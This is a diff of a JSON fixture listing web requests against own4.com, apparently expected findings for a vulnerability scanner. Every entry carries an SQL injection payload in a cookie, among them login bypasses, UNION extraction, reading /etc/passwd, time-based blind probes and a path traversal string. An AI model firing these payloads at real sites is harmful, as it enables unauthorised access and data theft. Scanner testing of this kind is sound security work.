+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=admin' --;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=admin' --;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=admin' #;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=admin' #;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=admin'/*;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=admin'/*;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=/*comment*/;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=/*comment*/;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=/*!32302 1/0, */;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=/*!32302 1/0, */;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='; SELECT sleep(10);", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='; SELECT sleep(10);"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='1'OR'1';", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='1'OR'1';"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=1' OR '1'='1;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=1' OR '1'='1;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=1'or'1;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=1'or'1;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=' or 1=1--;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=' or 1=1--;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=' or 1=1#;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=' or 1=1#;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=' or 1=1/*;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=' or 1=1/*;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=') or '1'='1--;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=') or '1'='1--;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=') or ('1'='1--;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=') or ('1'='1--;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie= HAVING 1=1 --;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie= HAVING 1=1 --;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=1%20and%20 1=1;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=1%20and%20 1=1;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
         }, 
         {
-            "url": "https://own4.com/nextlevel/page4.html", 
+            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
             "header": {
-                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;", 
-                "referer": "https://own4.com/index.html", 
-                "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
+                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;"
             }, 
             "type": "GET", 
             "class": "SQL Injection"
@@ -3865,6 +3213,254 @@
             "class": "SQL Injection"
         }, 
         {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1 or ';"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' --;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' #;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin'/*;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=/*comment*/;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=/*!32302 1/0, */;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='; SELECT sleep(10);"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='1'OR'1';"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1' OR '1'='1;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1'or'1;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1--;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1#;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' or 1=1/*;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=') or '1'='1--;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=') or ('1'='1--;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie= HAVING 1=1 --;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1%20and%20 1=1;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=2+union+(select+load_file('/etc/passwd'),null,null,null,null,null,null,null,null,null,null,null+from+dual);"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=2+union+(select+@@version,null,null,null,null,null,null,null,null,null,null,null+from+dual);"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=' and 1 = any (select 1 from users where FULL_NAME like '%%dministrator' and rownum<=1 and PASSWORD like '0%') and '1%%'='1;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
+            "url": "https://own4.com/nextlevel/nextlevel/page5.html", 
+            "header": {
+                "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;"
+            }, 
+            "type": "GET", 
+            "class": "SQL Injection"
+        }, 
+        {
             "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page11.php", 
             "header": {
                 "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
@@ -4418,254 +4014,6 @@
                 "Cookie": "Own4Cookie=1';select pg_sleep(2); \u2014;", 
                 "referer": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/page7.html", 
                 "user-agent": "Scrapy/1.5.0 (+https://scrapy.org)"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FREADME;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1 or ';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' --;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' #;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin'/*;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=/*comment*/;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=/*!32302 1/0, */;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='; SELECT sleep(10);"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='1'OR'1';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1' OR '1'='1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1'or'1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1#;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=' or 1=1/*;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=') or '1'='1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=') or ('1'='1--;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055';"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie= HAVING 1=1 --;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=1%20and%20 1=1;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union select all 1,2,x,x,x,x \u2014;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union select 1,2,3,x,x,x,x,@@version,x\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+banner,null,null,null,null+from+v$version\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+user,null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+global_name,null,null,null,null+from+global_name\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+owner,null,null,null,null+from+all_tables\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie='union+select+UTL_INADDR.get_host_address,null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
-                "Cookie": "Own4Cookie=%27union+select+UTL_INADDR.get_host_name('INTERNALs-IP'),null,null,null,null+from+dual\u2013;"
-            }, 
-            "type": "GET", 
-            "class": "SQL Injection"
-        }, 
-        {
-            "url": "https://own4.com/nextlevel/nextlevel/nextlevel/nextlevel/nextlevel/page8.html", 
-            "header": {
